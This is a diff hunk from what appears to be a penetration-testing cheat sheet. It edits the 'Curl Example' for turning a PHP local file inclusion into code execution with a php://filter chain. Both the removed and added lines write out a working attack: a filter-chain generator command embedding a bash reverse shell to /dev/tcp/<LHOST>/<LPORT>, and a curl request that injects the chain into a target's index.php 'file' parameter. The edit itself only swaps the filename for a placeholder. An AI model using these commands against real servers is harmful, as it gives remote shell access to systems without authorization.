@@ -3591,11 +3591,11 @@ php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<--- SNIP --->
 #### Curl Example
 
 ```c
-$ python3 php_filter_chain_generator.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'); ?>" | grep "^php" > payload.txt
+$ python3 php_filter_chain_generator.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'); ?>" | grep "^php" > <FILE>
 ```
 
 ```c
-$ curl "http://<RHOST>/index.php?file=$(cat payload.txt)"
+$ curl "http://<RHOST>/index.php?file=$(cat <FILE>)"
 ```
 
 ### PHP Deserialization (Web Server Poisoning)
